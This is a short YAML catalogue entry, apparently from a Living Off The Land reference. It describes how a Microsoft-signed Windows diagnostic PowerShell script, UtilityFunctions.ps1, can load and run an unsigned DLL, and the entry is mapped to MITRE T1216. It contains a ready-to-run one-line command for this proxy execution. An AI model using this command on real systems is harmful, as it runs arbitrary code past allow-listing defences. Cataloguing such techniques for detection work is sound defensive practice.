---
Name: UtilityFunctions.ps1
Description: PowerShell Diagnostic Script
Author: Jimmy (@bohops)
Created: 2021-09-26
Commands:
  - Command: 'powershell.exe -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()”'
    Description: Proxy execute Managed DLL with PowerShell
    Usecase: Execute proxied payload with Microsoft signed binary
    Category: Execute
    Privileges: User
    MitreID: T1216
    OperatingSystem: Windows 10 21H1 (likely other versions as well)
Full_Path:
  - Path: C:\Windows\diagnostics\system\Networking\UtilityFunctions.ps1
Code_Sample:
  - Code:
Detection:
Resources:
  - Link: https://twitter.com/nickvangilder/status/1441003666274668546
Acknowledgement:
  - Person: Nick VanGilder
    Handle: '@nickvangilder'
---
